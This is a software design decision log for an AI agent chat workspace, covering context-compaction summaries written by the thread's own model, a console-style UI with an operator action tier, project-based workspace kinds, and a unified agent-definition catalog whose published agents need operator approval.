- **D112 — Who writes the summary 🟢 DECIDED: the thread's own model, continuing its own conversation.** A fold used to hand a re-rendered text transcript of the thread to the utility model, chunked to fit that model's window and merged map/reduce, with reasoning requested off. Every piece of that existed to accommodate a smaller, colder model, and on this workspace's home deployment — one large local model serving the thread — it bought the worst of both: the utility model is usually the same endpoint, so the fold evicted the thread's KV cache to prefill a transcript of the very conversation that cache held, and then summarized a lossy re-rendering of it. Now the summary is written by the agent the turn runs on: the replay it would be sent (normalised exactly as the prelude normalises it — dangling calls stripped, consecutive requests merged), plus **one appended user message** carrying the compaction instructions, on the same brief and the same tool array, with `tool_choice='none'`. The request shares its whole prefix with the one the engine last served, so a local server reads the thread from cache; the model is already loaded; and the reader is the model that did the work, in its own format. The prelude threshold, the one overflow recovery and the manual button all fold this way; the manual fold resolves the thread's main model and composes its agent from the same pieces a chat turn does.
  - **The model may think.** The session's normal reasoning settings apply. A `ThinkingPart` is never part of the summary, and an inlined `<think>` block is still stripped, so reasoning costs time but never becomes memory.
  - **It is a side run, and each observer was decided on its own terms.** The run is marked in its metadata and its stream reaches nothing but the summary deltas. `AnnounceInjections` and `WatchPrefix` keep state on the agent for its life, so they step aside — otherwise the turn after a prelude fold would announce nothing, and the prefix ledger would remember a request the operator never saw sent. `MeasureOverhead` measures into an event nobody reads, so `Run.context_overhead` is untouched. `ReinjectSystemPrompt`, tool search and code mode run as they always do, because they shape the prefix that has to match. A reply that calls a tool anyway — some local servers ignore `tool_choice` — fails the fold; the walk stops at the request node, so the call is never executed.
  - **The compaction prompt is a user message, never an instruction.** Putting it in the brief would change the head of the request and throw away the prefix the whole design exists to reuse. It lives in `prompts/compaction.py` now, says it is from the workspace rather than the operator, and still says tool results are data.
  - **Deleted with it:** the transcript renderer and its tool-result cap, the chunking and the merge rounds, `COMPACT_REDUCE_INSTRUCTIONS`, `auto_compact_input_max_tokens`, the summarizer input clamp and the utility-window plumbing that fed it.
  - **Rejected: keeping the utility model for cost.** The cost it saves is output tokens; the cost it adds is a cold prefill of the whole thread, a model swap on a single-GPU host, and a second-hand reading. On a hosted endpoint the main model's cached prefix makes the input cheap too.
  - **Rejected: proactive mid-turn compaction.** Folding underneath reasoning in flight would rewrite the history the engine is mid-way through serving, breaking exactly the cache prefix this decision relies on. The triggers are unchanged: the prelude between turns, one overflow recovery, the button.
  - **Rejected: a trimming fallback on overflow.** The overflow fold summarizes the thread's *recorded* turns, which is smaller than the request that failed. If even that overflows, the fold fails and the turn stops with the ordinary context notice — nothing is cut to make it fit.

- **D113 — The chat register 🟢 DECIDED: the square console, with an action tier for what needs the operator.** An audit of the chat surfaces found them split between two registers: the mission-control console (ruled frames, mono plates, square corners — the composer, console groups, the compaction readout) and soft cards (rounded fills, resting shadows, sans labels — tool cards, the View chip, the sub-agent card, the question card). The operator compared the same thread rendered both ways and chose the console. Design §10.18 and §6 carry the spec; `ui/components/ActionFrame.tsx` and `ChoiceList.tsx` carry the code.
  - **The console register.** Ruled frames, bare contents, mono uppercase plates naming each region, square corners, no resting shadow. Shadows stay only on things that float over content — menus, popovers, tooltips, toasts, modals.
  - **Rejected: the soft-card register.** It would have rewritten about 24 components and the design system's register, §8 and §10, reversed the most recent work (the mission-control composer), and spent the strongest container treatment on every row, so a card waiting on the operator would read like every card that wasn't. The console needed about 18 components to change and moved the code toward what the design system already said.
  - **The action tier.** A coloured border alone was too quiet for the one moment the run cannot continue. Anything waiting on the operator gets mass: a solid plate band in the state's colour with inverse text and a blinking square, a body tinted about 5–7% toward it, a filled primary with its key, and an echo in the composer and on the rail row. The colour names the ask — amber an approval, blue a question, red a conflict or stop. One shared `ActionFrame` (`tone: approval | question | alert`) so `ParkDock`, `QuestionAnswerCard`, `ConflictCard` and plan approval cannot drift apart. Question cards follow the operator's feedback: the frame is the card (no padding around the core), the answers are a radiogroup of edge-to-edge rows never set side by side, the pick is a filled keycap and a tinted row rather than a full inversion, free text is a real input row, and one footer holds the key hints and a single ANSWER.
  - **The LED edge light and the composer's bloom are removed.** `LedEdge` (a hairline with a four-layer directional glow) and the composer's `shadow-bloom` aura were light standing in for structure. The bloom's ~90px of reach landed on the last thing the model said, and in the console register the frame and the opaque fill already separate the input from the transcript. A live region now says so by its rule turning `info`; nothing glows.
  - **The ⌘K nav palette is removed.** The operator never used it. It took its settings index, its search derivations and `ListRow`'s option mode with it, and the rail loses its search glyph.
  - **Send is ⌘↵ (Ctrl+Enter off macOS); plain Enter is a newline.** A multi-line field that sends on Enter punishes writing a paragraph. Enter still picks an item while a `/` or `@` menu is open.

- **D114 — No modes: a chat's workspace follows its project, and the agent chooses isolation 🟢 DECIDED.** Supersedes D41's worktree-per-coding-thread, D58, D59's mode axis, D61 and D103. Every chat has the full tool catalog; what varies is only where its files are, a `workspace_kind` on the conversation (`services/workspace_kind.py`).
  - **`sandbox`** for a chat with no project: its own container, as before.
  - **`checkout`** for a chat filed under a project: the project's own folder, on whatever branch is checked out there. A quick edit should not cost a worktree. File writes are `workspace_write` and follow the permission level like everywhere else. One chat holds a folder at a time, and the hold lasts only while that chat has unfinished work (`services/projects/checkout.py`).
  - **`worktree`** when the agent calls `project_open_worktree`: D41's branch checkout, entered on demand for risky, sprawling or parallel work. The move is one-way and takes effect mid-turn, so workspace-scoped tools are withheld live at the enabled gate, like the permission level, rather than in the per-turn union.
  - **Research is a platform skill**, not a mode: `backend/skills/research/SKILL.md` carries the method, and the agent loads it when a question needs investigating. Claim-level attribution (D103) went with the mode it was built for.
  - **Rejected: worktree by default for project chats.** Isolation every chat pays for, most of which make one edit, is friction; the agent knows when a change deserves its own branch.
- **D115 — Agents are one definition, wherever they come from 🟢 DECIDED.** The sub-agent spec became `AgentDefinition` (`services/agents/`), and the chat's own agent is one too. A definition carries a brief, a model (endpoint and model, else the thread's), a tool allow- and deny-list by name or category, a permission ceiling, a delegation workspace, request and wall-clock limits, and whether it may delegate.
  - **Four sources, one catalog.** Built-ins ship in code (`default`, the chat agent, plus the roster workers); a project declares agents in `.claude/agents/*.md`; the operator and agents write stored ones (`agents` table, prose sealed). Precedence is stored > project > built-in, and `default` is never shadowed.
  - **A thread runs one agent**, named on the conversation (`agent_name`, null for `default`) and switchable on any send. Every turn on the thread — the operator's, a wake, a manual fold — resolves it through `services/agents/thread.py`, so its brief, tools and ceiling cannot differ between them. The ceiling caps the stored level and holds through a plan approval.
  - **Agents writing agents.** `agents_write` saves a draft; nothing runs a draft. Publishing (`agents_publish`) and rewriting a published agent are the operator's to approve.
  - **A project file's `model:` is not read.** It names a model of the tool it was written for, not an endpoint here; a stored agent picks its endpoint explicitly.
